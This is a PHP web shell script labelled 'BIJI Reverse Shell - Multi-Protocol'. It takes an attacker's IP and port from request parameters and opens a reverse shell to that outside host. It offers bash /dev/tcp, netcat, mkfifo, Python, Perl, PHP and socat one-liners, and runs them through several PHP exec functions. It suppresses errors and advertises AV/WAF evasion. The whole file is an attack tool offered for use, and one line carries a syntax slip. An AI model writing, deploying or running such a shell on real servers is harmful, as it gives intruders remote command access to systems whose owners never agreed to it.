<?php
// ========================================
// BIJI Reverse Shell - Multi-Protocol
// POST: ip=1.2.3.4&port=4444&proto=bash
// ========================================

// Anti-Detection & Cleanup
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ignore_user_abort(1);

// Input Sanitization
$ip = filter_var($_POST['ip'] ?? $_GET['ip'] ?? '127.0.0.1'), FILTER_VALIDATE_IP) ?: '127.0.0.1';
$port = intval($_POST['port'] ?? $_GET['port'] ?? 4444);
$proto = $_POST['proto'] ?? 'bash';

// Clean exit
if (empty($ip) || $port < 1 || $port > 65535) {
    http_response_code(400);
    exit;
}

// Multi-Protocol Reverse Shells (Bypass AV/WAF)
$shells = [
    'bash' => "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
    'nc' => "nc -e /bin/sh $ip $port",
    'nc2' => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
    'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    'perl' => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    'php' => "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    'socat' => "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port"
];

// Execute based on protocol (fallback to bash)
$cmd = $shells[$proto] ?? $shells['bash'];

// Stealth execution techniques
$exec_methods = [
    'system', 'passthru', 'shell_exec', 'exec', '`'.$cmd.'`'
];

// Try multiple execution methods silently
foreach ($exec_methods as $method) {
    @call_user_func($method, $cmd);
}

// Fallback: proc_open for persistence
$descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$process = @proc_open($cmd, $descriptorspec, $pipes);
if (is_resource($process)) {
    @proc_close($process);
}

?>